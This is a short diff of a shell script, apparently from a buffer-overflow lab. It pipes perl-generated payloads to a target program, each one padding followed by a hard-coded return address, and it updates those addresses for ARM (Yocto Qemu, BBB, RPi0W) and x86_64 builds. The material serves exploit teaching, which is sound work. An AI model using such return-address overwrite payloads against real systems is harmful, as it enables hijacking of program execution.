@@ -84,10 +84,12 @@ if [ "$1" = "-a" ]; then
   #0x000104c4 (on RPi0W)
   #perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ${PUT}
   #0x00010494 (on BBB)
-  perl -e 'print "A"x12 . "B"x4 . "\x94\x04\x01\x00"' | ${PUT}
+  #perl -e 'print "A"x12 . "B"x4 . "\x94\x04\x01\x00"' | ${PUT}
+  # 000104ac on Yocto Qemu ARM
+  perl -e 'print "A"x12 . "B"x4 . "\xac\x04\x01\x00"' | ${PUT}
 elif [ "$1" = "-x" ]; then
-  #0x0000000000401176 (on x86_64)
-  perl -e 'print "A"x12 . "B"x4 . "\x76\x11\x40\x00"' | ${PUT}
+  #0x00000000004011b6 (on x86_64)
+  perl -e 'print "A"x12 . "B"x4 . "\xb6\x11\x40\x00"' | ${PUT}
   #perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ${PUT}
 fi
 
